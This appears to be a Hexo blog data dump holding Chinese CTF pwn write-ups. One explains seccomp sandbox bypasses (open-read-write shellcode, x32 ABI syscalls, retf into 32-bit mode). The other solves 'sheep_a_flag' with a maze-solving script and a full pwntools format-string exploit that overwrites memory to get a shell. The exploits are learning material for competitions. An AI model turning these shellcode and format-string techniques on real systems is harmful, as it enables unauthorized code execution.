class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"利用x32ABI\"><a href=\"#利用x32ABI\" class=\"headerlink\" title=\"利用x32ABI\"></a>利用x32ABI</h3><p>当<code>orw</code>的系统调用均不可行时，可以利用64位系统对32位程序的支持来实现<code>orw</code>。</p>\n<p><code>x32 ABI</code>是ABI (Application Binary Interface)，同样也是linux系统内核接口之一。x32 ABI允许在64位架构下（包括指令集、寄存器等）使用32位指针。</p>\n<p><code>x32 ABI</code>与64位下的系统调用方法几乎无异（一样走syscall），只不过系统调用号都是不小于<strong>0x40000000</strong>，并且要求使用32位指针。</p>\n<p>部分沙箱会缺少对<code>X32 ABI</code>的限制</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0003: 0x35 0x05 0x00 0x40000000  <span class=\"keyword\">if</span> (A &gt;= 0x40000000) goto ALLOW <span class=\"comment\"># 允许sys_number&gt;=0x40000000</span></span><br></pre></td></tr></table></figure>\n\n<p>具体的调用表可以查看系统头文件中的<code>/usr/src/linux-headers-$version-generic/arch/x86/include/generated/uapi/asm/unistd_x32.h</code>，大致如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// #define __X32_SYSCALL_BIT\t0x40000000</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> _UAPI_ASM_UNISTD_X32_H</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _UAPI_ASM_UNISTD_X32_H</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __NR_read (__X32_SYSCALL_BIT + 0)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __NR_write (__X32_SYSCALL_BIT + 1)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __NR_open (__X32_SYSCALL_BIT + 2)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __NR_close (__X32_SYSCALL_BIT + 3)</span></span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span> <span class=\"comment\">/* _UAPI_ASM_UNISTD_X32_H */</span></span></span><br></pre></td></tr></table></figure>\n\n<p>因此这里我们就可以利用<code>0x40000002</code>的<code>open</code>来补上<code>orw</code>缺少的<code>open</code>。</p>\n<h3 id=\"利用32位模式\"><a href=\"#利用32位模式\" class=\"headerlink\" title=\"利用32位模式\"></a>利用32位模式</h3><p>32位模式即64位系统下运行32位程序的模式，此时<strong>CS寄存器的值为0x23</strong>。在该模式下，程序与在32位系统中运行几乎无异，即只能使用32位寄存器，所有指针必须为32位，指令集为32位指令集等。</p>\n<p>与之相对地，<strong>64位模式对应的CS寄存器的值为0x33</strong>。</p>\n<p>进入32位模式需要更改CS寄存器为0x23。retf (far return) 指令可以帮助我们做到这一点。retf指令相当于：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pop ip # 下一条指令</span><br><span class=\"line\">pop cs # 修改cs寄存器</span><br></pre></td></tr></table></figure>\n\n<p>需要注意的是，在使用pwntools构造shellcode时，需要指定retf的地址长度，即可以使用retfd和retfq。</p>\n<p>因为进入32位模式后，sp, ip寄存器也会变成32位，所以需要将<strong>栈迁移至32位地址上</strong>；利用或构造32位地址的RWX内存段，写入<strong>32位shellcode</strong>；最后在栈上构造fake ip, cs，执行<strong>retf</strong>指令。</p>\n<p>利用前提：</p>\n<ul>\n<li>沙箱中不包含对arch==ARCH_x86_64的检测</li>\n<li>存在或可构造32位地址的RWX内存段</li>\n</ul>\n<p>其中，构造RWX内存段可使用mmap申请新的内存，或使用mprotect使已有的段变为RWX权限。</p>\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3>","site":{"data":{}},"excerpt":"<p>Sandbox的基础知识</p>","more":"<h2 id=\"Sandbox\"><a href=\"#Sandbox\" class=\"headerlink\" title=\"Sandbox\"></a>Sandbox</h2><p>[<a href=\"https://www.cnblogs.com/L0g4n-blog/p/12839171.html]\">https://www.cnblogs.com/L0g4n-blog/p/12839171.html]</a></p>\n<p>沙箱(Sandbox)是程序中的一种隔离机制，其目的是<strong>限制不可信进程和不可信代码的访问权限</strong>。</p>\n<p>seccomp是内核中的一种安全机制，seccomp可以在程序中<strong>禁用掉一些系统调用</strong>来达到保护系统安全的目的，seccomp规则的设置，可以使用prctl函数和seccomp函数族。</p>\n<p>prctl()函数：</p>\n<p>prctl是基本的进程管理函数，最原始的沙箱规则就是通过prctl函数来实现的，它可以<strong>决定有哪些系统调用函数可以被调用，哪些系统调用函数不能被调用</strong>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">prctl</span><span class=\"params\">(<span class=\"type\">int</span> option,<span class=\"type\">unsigned</span> <span class=\"type\">long</span> argv2,<span class=\"type\">unsigned</span> <span class=\"type\">long</span> argv3,<span class=\"type\">unsigned</span> <span class=\"type\">long</span> argv4，<span class=\"type\">unsigned</span> <span class=\"type\">long</span> argv5)</span></span><br></pre></td></tr></table></figure>\n\n<p>参数option是选项，表示你要干什么，后面的参数都是对该option的辅助。</p>\n<p>参数option需要重点关注的有：</p>\n<ul>\n<li>PR_SET_SECCOMP(也就是22):当第一个参数是PR_SET_SECCOMP,第二个参数<strong>argv2为1</strong>的时候，表示允许的系统调用有<strong>read，write，exit和sigereturn</strong>；当<strong>argv2等于2</strong>的时候，表示允许的系统调用<strong>由argv3指向sock_fprog结构体定义</strong>，该结构体成员指向的sock_filter可以定义过滤任意系统调用和系统调用参数。</li>\n<li>PR_SET_NO_NEWPRIVS(也就是38):prctl(38,1,0,0,0)表示禁用系统调用execve()函数，同时，这个选项可以通过fork()函数和clone()函数<strong>继承给子进程</strong>。</li>\n</ul>\n<h2 id=\"绕过沙箱\"><a href=\"#绕过沙箱\" class=\"headerlink\" title=\"绕过沙箱\"></a>绕过沙箱</h2><h3 id=\"orw\"><a href=\"#orw\" class=\"headerlink\" title=\"orw\"></a>orw</h3><p>一般最普通的沙箱都是禁用了<code>execve</code>类的函数，这将会导致我们无法使用<code>one_gadget</code>和<code>system(&quot;/bin/sh\\x00&quot;)</code>来get shell。但是pwn的最终结果并不是要求我们get shell，而是要求我们能拿到flag，所以我们可以面向flag编程，使用<code>open -&gt; read -&gt; write</code>来打开，读取最后输出flag。</p>\n<p><code>orw</code>过程的实现可以是通过<strong>ROP</strong>链的<code>orw</code>，也可以是通过<strong>shellcode</strong>的<code>orw</code>，甚至可以使用<code>shellcraft.cat(&quot;./flag\\x00&quot;)</code>原理上都是一样的。</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcode=asm(</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    mov rax, 0x67616c662f</span></span><br><span class=\"line\"><span class=\"string\">    push rax</span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\">    push 0x2</span></span><br><span class=\"line\"><span class=\"string\">    pop rax</span></span><br><span class=\"line\"><span class=\"string\">    mov rdi, rsp</span></span><br><span class=\"line\"><span class=\"string\">    mov rdx, 0x440</span></span><br><span class=\"line\"><span class=\"string\">    xor rsi, rsi</span></span><br><span class=\"line\"><span class=\"string\">    syscall</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    mov rdi, rax</span></span><br><span class=\"line\"><span class=\"string\">    sub rsp, rdx</span></span><br><span class=\"line\"><span class=\"string\">    mov rsi, rsp</span></span><br><span class=\"line\"><span class=\"string\">    xor rax, rax</span></span><br><span class=\"line\"><span class=\"string\">    syscall</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    mov rdx, rax</span></span><br><span class=\"line\"><span class=\"string\">    push 0x2</span></span><br><span class=\"line\"><span class=\"string\">    pop rdi</span></span><br><span class=\"line\"><span class=\"string\">    push 0x1</span></span><br><span class=\"line\"><span class=\"string\">    pop rax</span></span><br><span class=\"line\"><span class=\"string\">    syscall </span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"利用x32ABI\"><a href=\"#利用x32ABI\" class=\"headerlink\" title=\"利用x32ABI\"></a>利用x32ABI</h3><p>当<code>orw</code>的系统调用均不可行时，可以利用64位系统对32位程序的支持来实现<code>orw</code>。</p>\n<p><code>x32 ABI</code>是ABI (Application Binary Interface)，同样也是linux系统内核接口之一。x32 ABI允许在64位架构下（包括指令集、寄存器等）使用32位指针。</p>\n<p><code>x32 ABI</code>与64位下的系统调用方法几乎无异（一样走syscall），只不过系统调用号都是不小于<strong>0x40000000</strong>，并且要求使用32位指针。</p>\n<p>部分沙箱会缺少对<code>X32 ABI</code>的限制</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0003: 0x35 0x05 0x00 0x40000000  <span class=\"keyword\">if</span> (A &gt;= 0x40000000) goto ALLOW <span class=\"comment\"># 允许sys_number&gt;=0x40000000</span></span><br></pre></td></tr></table></figure>\n\n<p>具体的调用表可以查看系统头文件中的<code>/usr/src/linux-headers-$version-generic/arch/x86/include/generated/uapi/asm/unistd_x32.h</code>，大致如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// #define __X32_SYSCALL_BIT\t0x40000000</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> _UAPI_ASM_UNISTD_X32_H</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _UAPI_ASM_UNISTD_X32_H</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __NR_read (__X32_SYSCALL_BIT + 0)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __NR_write (__X32_SYSCALL_BIT + 1)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __NR_open (__X32_SYSCALL_BIT + 2)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __NR_close (__X32_SYSCALL_BIT + 3)</span></span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span> <span class=\"comment\">/* _UAPI_ASM_UNISTD_X32_H */</span></span></span><br></pre></td></tr></table></figure>\n\n<p>因此这里我们就可以利用<code>0x40000002</code>的<code>open</code>来补上<code>orw</code>缺少的<code>open</code>。</p>\n<h3 id=\"利用32位模式\"><a href=\"#利用32位模式\" class=\"headerlink\" title=\"利用32位模式\"></a>利用32位模式</h3><p>32位模式即64位系统下运行32位程序的模式，此时<strong>CS寄存器的值为0x23</strong>。在该模式下，程序与在32位系统中运行几乎无异，即只能使用32位寄存器，所有指针必须为32位，指令集为32位指令集等。</p>\n<p>与之相对地，<strong>64位模式对应的CS寄存器的值为0x33</strong>。</p>\n<p>进入32位模式需要更改CS寄存器为0x23。retf (far return) 指令可以帮助我们做到这一点。retf指令相当于：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pop ip # 下一条指令</span><br><span class=\"line\">pop cs # 修改cs寄存器</span><br></pre></td></tr></table></figure>\n\n<p>需要注意的是，在使用pwntools构造shellcode时，需要指定retf的地址长度，即可以使用retfd和retfq。</p>\n<p>因为进入32位模式后，sp, ip寄存器也会变成32位，所以需要将<strong>栈迁移至32位地址上</strong>；利用或构造32位地址的RWX内存段，写入<strong>32位shellcode</strong>；最后在栈上构造fake ip, cs，执行<strong>retf</strong>指令。</p>\n<p>利用前提：</p>\n<ul>\n<li>沙箱中不包含对arch==ARCH_x86_64的检测</li>\n<li>存在或可构造32位地址的RWX内存段</li>\n</ul>\n<p>其中，构造RWX内存段可使用mmap申请新的内存，或使用mprotect使已有的段变为RWX权限。</p>\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3>"},{"title":"sheep_a_flag","date":"2023-01-02T11:54:26.000Z","_content":"\nNewStar CTF 的整活题，考格式化字符串还有走迷宫的算法。\n\n走迷宫，如果能够走出去，就能够跳转到一个格式化字符串漏洞，利用该漏洞将0x602080中的内容修改为1919810即可get shell。\n\n<!-- more -->\n\n走迷宫：(DFS)\n\n```python\nans=''\nv=[]\nmap=[]\n#深度优先回溯法走迷宫\ndef dfs(res,x,y):\n global ans\n #print(x,y,flag_x,flag_y,res,sep=' ')\n if x==flag_x and y==flag_y:\n  print('you')\n  ans=res\n  return\n if x>0 and map[x-1][y]!=0 and v[x-1][y]!=1:\n  v[x-1][y]=1\n  dfs(res+'w',x-1,y)\n  v[x-1][y]=0\n if y>0 and map[x][y-1]!=0 and v[x][y-1]!=1:\n  v[x][y-1]=1\n  dfs(res+'a',x,y-1)\n  v[x][y-1]=0\n if y<23 and map[x][y+1]!=0 and v[x][y+1]!=1:\n  v[x][y+1]=1\n  dfs(res+'d',x,y+1)\n  v[x][y+1]=0\n if x<23 and map[x+1][y]!=0 and v[x+1][y]!=1:\n  v[x+1][y]=1\n  dfs(res+'s',x+1,y)\n  v[x+1][y]=0\n return \n\nsheep_x=-1\nsheep_y=-1\nflag_x=-1\nflag_y=-1\np.recvuntil('position!\\n')\n#遍历获取地图\nfor i in range(24):\n x=[]\n y=[]\n a=p.recvline().decode(\"utf-8\")\n for j in range(24):\n  y.append(0)\n  if a[j]==\"🈲\".decode(\"utf-8\"):\n   x.append(0)\n  if a[j]=='⬛'.decode(\"utf-8\"):\n   x.append(0)\n  if a[j]=='⬜'.decode(\"utf-8\"):\n   x.append(1)\n  if a[j]=='🐏'.decode(\"utf-8\"):\n   x.append(2)\n   sheep_x=i\n   sheep_y=j\n  if a[j]=='🚩'.decode(\"utf-8\"):\n   x.append(3)\n   flag_x=i\n   flag_y=j\n map.append(x)\n v.append(y)\ndfs('',sheep_x,sheep_y)\n```\n\n后面就是一个格式化字符串漏洞\n\n```c\nunsigned __int64 __fastcall vuln()\n{\n  __int64 v0; // rbp\n\n  read(0, (void *)(v0 - 0x60), 0x50uLL);\n  printf((const char *)(v0 - 0x60));            // 格式化字符串漏洞，修改0x602080为1919810即0x1D4B42\n  return __readfsqword(0x28u) ^ *(_QWORD *)(v0 - 8);\n}\n```\n\n0x602080写入0x42，0x602081写入0x4d，0x602082写入0x1d，使用hhn每次写入1字节，从小到大写，先0x602082，再0x602080，最后写0x602080。计算一下三个地址是第几个参数，写入内容8byte对齐后，使用%c来输出一些字节凑数即可。\n\n```python\n#overwrite 0x602080 to 0x1D4B42\n#0x1D(29) to 0x602082\n#0x42(+37) to 0x602080\n#0x4B(+9) to 0x602081\n\n#start from 6\n#9 + 9 + 8 + 0x18\n#26=>0x18+2=>+2 +2 +2=>0x20=>+4=>6+4=10\npayload='%29c%10$hhn'+'%37c%11$hhn'+'%9c%12$hhn'+p64(0x602082)+p64(0x602080)+p64(0x602081)\np.sendline(payload)\np.interactive()\n```\n\nexp:\n\n```python\n# -*- coding: UTF-8 -*-\nfrom pwn import*\ncontext(log_level='debug')\n#p=remote('node4.buuoj.cn',27884)\np=process('./sheep_a_flag')\ndef debug(cmd='\\n'):\n\tgdb.attach(p,cmd)\n\tpause()\n\nans=''\nv=[]\nmap=[]\ndef dfs(res,x,y):\n\tglobal ans\n\t#print(x,y,flag_x,flag_y,res,sep=' ')\n\tif x==flag_x and y==flag_y:\n\t\tprint('you')\n\t\tans=res\n\t\treturn\n\tif x>0 and map[x-1][y]!=0 and v[x-1][y]!=1:\n\t\tv[x-1][y]=1\n\t\tdfs(res+'w',x-1,y)\n\t\tv[x-1][y]=0\n\tif y>0 and map[x][y-1]!=0 and v[x][y-1]!=1:\n\t\tv[x][y-1]=1\n\t\tdfs(res+'a',x,y-1)\n\t\tv[x][y-1]=0\n\tif y<23 and map[x][y+1]!=0 and v[x][y+1]!=1:\n\t\tv[x][y+1]=1\n\t\tdfs(res+'d',x,y+1)\n\t\tv[x][y+1]=0\n\tif x<23 and map[x+1][y]!=0 and v[x+1][y]!=1:\n\t\tv[x+1][y]=1\n\t\tdfs(res+'s',x+1,y)\n\t\tv[x+1][y]=0\n\treturn \n\nsheep_x=-1\nsheep_y=-1\nflag_x=-1\nflag_y=-1\np.recvuntil('position!\\n')\nfor i in range(24):\n\tx=[]\n\ty=[]\n\ta=p.recvline().decode(\"utf-8\")\n\tfor j in range(24):\n\t\ty.append(0)\n\t\tif a[j]==\"🈲\".decode(\"utf-8\"):\n\t\t\tx.append(0)\n\t\tif a[j]=='⬛'.decode(\"utf-8\"):\n\t\t\tx.append(0)\n\t\tif a[j]=='⬜'.decode(\"utf-8\"):\n\t\t\tx.append(1)\n\t\tif a[j]=='🐏'.decode(\"utf-8\"):\n\t\t\tx.append(2)\n\t\t\tsheep_x=i\n\t\t\tsheep_y=j\n\t\tif a[j]=='🚩'.decode(\"utf-8\"):\n\t\t\tx.append(3)\n\t\t\tflag_x=i\n\t\t\tflag_y=j\n\tmap.append(x)\n\tv.append(y)\ndfs('',sheep_x,sheep_y)\n\np.recvuntil('Ans: \\n')\np.sendline(ans)\np.recvuntil('it ?!\\n')\ndebug('b *0x4011c3')\n#overwrite 0x602080 to 0x1D4B42\n#0x1D(29) to 0x602082\n#0x42(+37) to 0x602080\n#0x4B(+9) to 0x602081\n\n#start from 6\n#9 + 9 + 8 + 0x18\n#26=>0x18+2=>+2 +2 +2=>0x20=>+4=>6+4=10\npayload='%29c%10$hhn'+'%37c%11$hhn'+'%9c%12$hhn'+p64(0x602082)+p64(0x602080)+p64(0x602081)\np.sendline(payload)\np.interactive()\n\n```","source":"_posts/sheep_a_flag.md","raw":"---\ntitle: sheep_a_flag\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- format\n- DFS\n\n\n---\n\nNewStar CTF 的整活题，考格式化字符串还有走迷宫的算法。\n\n走迷宫，如果能够走出去，就能够跳转到一个格式化字符串漏洞，利用该漏洞将0x602080中的内容修改为1919810即可get shell。\n\n<!-- more -->\n\n走迷宫：(DFS)\n\n```python\nans=''\nv=[]\nmap=[]\n#深度优先回溯法走迷宫\ndef dfs(res,x,y):\n global ans\n #print(x,y,flag_x,flag_y,res,sep=' ')\n if x==flag_x and y==flag_y:\n  print('you')\n  ans=res\n  return\n if x>0 and map[x-1][y]!=0 and v[x-1][y]!=1:\n  v[x-1][y]=1\n  dfs(res+'w',x-1,y)\n  v[x-1][y]=0\n if y>0 and map[x][y-1]!=0 and v[x][y-1]!=1:\n  v[x][y-1]=1\n  dfs(res+'a',x,y-1)\n  v[x][y-1]=0\n if y<23 and map[x][y+1]!=0 and v[x][y+1]!=1:\n  v[x][y+1]=1\n  dfs(res+'d',x,y+1)\n  v[x][y+1]=0\n if x<23 and map[x+1][y]!=0 and v[x+1][y]!=1:\n  v[x+1][y]=1\n  dfs(res+'s',x+1,y)\n  v[x+1][y]=0\n return \n\nsheep_x=-1\nsheep_y=-1\nflag_x=-1\nflag_y=-1\np.recvuntil('position!\\n')\n#遍历获取地图\nfor i in range(24):\n x=[]\n y=[]\n a=p.recvline().decode(\"utf-8\")\n for j in range(24):\n  y.append(0)\n  if a[j]==\"🈲\".decode(\"utf-8\"):\n   x.append(0)\n  if a[j]=='⬛'.decode(\"utf-8\"):\n   x.append(0)\n  if a[j]=='⬜'.decode(\"utf-8\"):\n   x.append(1)\n  if a[j]=='🐏'.decode(\"utf-8\"):\n   x.append(2)\n   sheep_x=i\n   sheep_y=j\n  if a[j]=='🚩'.decode(\"utf-8\"):\n   x.append(3)\n   flag_x=i\n   flag_y=j\n map.append(x)\n v.append(y)\ndfs('',sheep_x,sheep_y)\n```\n\n后面就是一个格式化字符串漏洞\n\n```c\nunsigned __int64 __fastcall vuln()\n{\n  __int64 v0; // rbp\n\n  read(0, (void *)(v0 - 0x60), 0x50uLL);\n  printf((const char *)(v0 - 0x60));            // 格式化字符串漏洞，修改0x602080为1919810即0x1D4B42\n  return __readfsqword(0x28u) ^ *(_QWORD *)(v0 - 8);\n}\n```\n\n0x602080写入0x42，0x602081写入0x4d，0x602082写入0x1d，使用hhn每次写入1字节，从小到大写，先0x602082，再0x602080，最后写0x602080。计算一下三个地址是第几个参数，写入内容8byte对齐后，使用%c来输出一些字节凑数即可。\n\n```python\n#overwrite 0x602080 to 0x1D4B42\n#0x1D(29) to 0x602082\n#0x42(+37) to 0x602080\n#0x4B(+9) to 0x602081\n\n#start from 6\n#9 + 9 + 8 + 0x18\n#26=>0x18+2=>+2 +2 +2=>0x20=>+4=>6+4=10\npayload='%29c%10$hhn'+'%37c%11$hhn'+'%9c%12$hhn'+p64(0x602082)+p64(0x602080)+p64(0x602081)\np.sendline(payload)\np.interactive()\n```\n\nexp:\n\n```python\n# -*- coding: UTF-8 -*-\nfrom pwn import*\ncontext(log_level='debug')\n#p=remote('node4.buuoj.cn',27884)\np=process('./sheep_a_flag')\ndef debug(cmd='\\n'):\n\tgdb.attach(p,cmd)\n\tpause()\n\nans=''\nv=[]\nmap=[]\ndef dfs(res,x,y):\n\tglobal ans\n\t#print(x,y,flag_x,flag_y,res,sep=' ')\n\tif x==flag_x and y==flag_y:\n\t\tprint('you')\n\t\tans=res\n\t\treturn\n\tif x>0 and map[x-1][y]!=0 and v[x-1][y]!=1:\n\t\tv[x-1][y]=1\n\t\tdfs(res+'w',x-1,y)\n\t\tv[x-1][y]=0\n\tif y>0 and map[x][y-1]!=0 and v[x][y-1]!=1:\n\t\tv[x][y-1]=1\n\t\tdfs(res+'a',x,y-1)\n\t\tv[x][y-1]=0\n\tif y<23 and map[x][y+1]!=0 and v[x][y+1]!=1:\n\t\tv[x][y+1]=1\n\t\tdfs(res+'d',x,y+1)\n\t\tv[x][y+1]=0\n\tif x<23 and map[x+1][y]!=0 and v[x+1][y]!=1:\n\t\tv[x+1][y]=1\n\t\tdfs(res+'s',x+1,y)\n\t\tv[x+1][y]=0\n\treturn \n\nsheep_x=-1\nsheep_y=-1\nflag_x=-1\nflag_y=-1\np.recvuntil('position!\\n')\nfor i in range(24):\n\tx=[]\n\ty=[]\n\ta=p.recvline().decode(\"utf-8\")\n\tfor j in range(24):\n\t\ty.append(0)\n\t\tif a[j]==\"🈲\".decode(\"utf-8\"):\n\t\t\tx.append(0)\n\t\tif a[j]=='⬛'.decode(\"utf-8\"):\n\t\t\tx.append(0)\n\t\tif a[j]=='⬜'.decode(\"utf-8\"):\n\t\t\tx.append(1)\n\t\tif a[j]=='🐏'.decode(\"utf-8\"):\n\t\t\tx.append(2)\n\t\t\tsheep_x=i\n\t\t\tsheep_y=j\n\t\tif a[j]=='🚩'.decode(\"utf-8\"):\n\t\t\tx.append(3)\n\t\t\tflag_x=i\n\t\t\tflag_y=j\n\tmap.append(x)\n\tv.append(y)\ndfs('',sheep_x,sheep_y)\n\np.recvuntil('Ans: \\n')\np.sendline(ans)\np.recvuntil('it ?!\\n')\ndebug('b *0x4011c3')\n#overwrite 0x602080 to 0x1D4B42\n#0x1D(29) to 0x602082\n#0x42(+37) to 0x602080\n#0x4B(+9) to 0x602081\n\n#start from 6\n#9 + 9 + 8 + 0x18\n#26=>0x18+2=>+2 +2 +2=>0x20=>+4=>6+4=10\npayload='%29c%10$hhn'+'%37c%11$hhn'+'%9c%12$hhn'+p64(0x602082)+p64(0x602080)+p64(0x602081)\np.sendline(payload)\np.interactive()\n\n```","slug":"sheep_a_flag","published":1,"updated":"2023-01-02T16:22:16.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czagj005w5oud2ks1dlhs","content":"<p>NewStar CTF 的整活题，考格式化字符串还有走迷宫的算法。</p>\n<p>走迷宫，如果能够走出去，就能够跳转到一个格式化字符串漏洞，利用该漏洞将0x602080中的内容修改为1919810即可get shell。</p>\n<span id=\"more\"></span>\n\n<p>走迷宫：(DFS)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">v=[]</span><br><span class=\"line\"><span class=\"built_in\">map</span>=[]</span><br><span class=\"line\"><span class=\"comment\">#深度优先回溯法走迷宫</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dfs</span>(<span class=\"params\">res,x,y</span>):</span><br><span class=\"line\"> <span class=\"keyword\">global</span> ans</span><br><span class=\"line\"> <span class=\"comment\">#print(x,y,flag_x,flag_y,res,sep=&#x27; &#x27;)</span></span><br><span class=\"line\"> <span class=\"keyword\">if</span> x==flag_x <span class=\"keyword\">and</span> y==flag_y:</span><br><span class=\"line\">  <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;you&#x27;</span>)</span><br><span class=\"line\">  ans=res</span><br><span class=\"line\">  <span class=\"keyword\">return</span></span><br><span class=\"line\"> <span class=\"keyword\">if</span> x&gt;<span class=\"number\">0</span> <span class=\"keyword\">and</span> <span class=\"built_in\">map</span>[x-<span class=\"number\">1</span>][y]!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> v[x-<span class=\"number\">1</span>][y]!=<span class=\"number\">1</span>:</span><br><span class=\"line\">  v[x-<span class=\"number\">1</span>][y]=<span class=\"number\">1</span></span><br><span class=\"line\">  dfs(res+<span class=\"string\">&#x27;w&#x27;</span>,x-<span class=\"number\">1</span>,y)</span><br><span class=\"line\">  v[x-<span class=\"number\">1</span>][y]=<span class=\"number\">0</span></span><br><span class=\"line\"> <span class=\"keyword\">if</span> y&gt;<span 